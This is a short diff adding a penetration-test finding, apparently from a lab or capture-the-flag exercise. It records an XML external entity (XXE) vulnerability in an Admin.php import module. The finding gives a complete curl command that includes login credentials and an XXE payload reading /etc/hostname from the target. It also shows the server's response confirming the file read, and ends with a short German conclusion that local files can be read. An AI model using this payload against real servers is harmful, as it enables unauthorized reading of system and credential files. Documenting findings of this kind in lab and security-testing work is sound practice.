@@ -1,0 +1,11 @@
+=== FINDING: XXE — Admin.php module=import (LIBXML_NOENT) ===
+
+$ curl -sS -X POST "http://10.10.10.10/Admin.php?Email=eliasv@cyberstepsvuln.com&Password=5225&module=import" \
+  --data-urlencode 'xml_data=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><data><name>&xxe;</name></data>' | grep -A5 "Parsed Data"
+
+<h4>Parsed Data:</h4><pre>SimpleXMLElement Object
+(
+    [name] => spears-Linux
+</pre>
+
+Erkenntnis: Externe Entity wird aufgelöst — Lesen lokaler Dateien (/etc/hostname bestätigt).
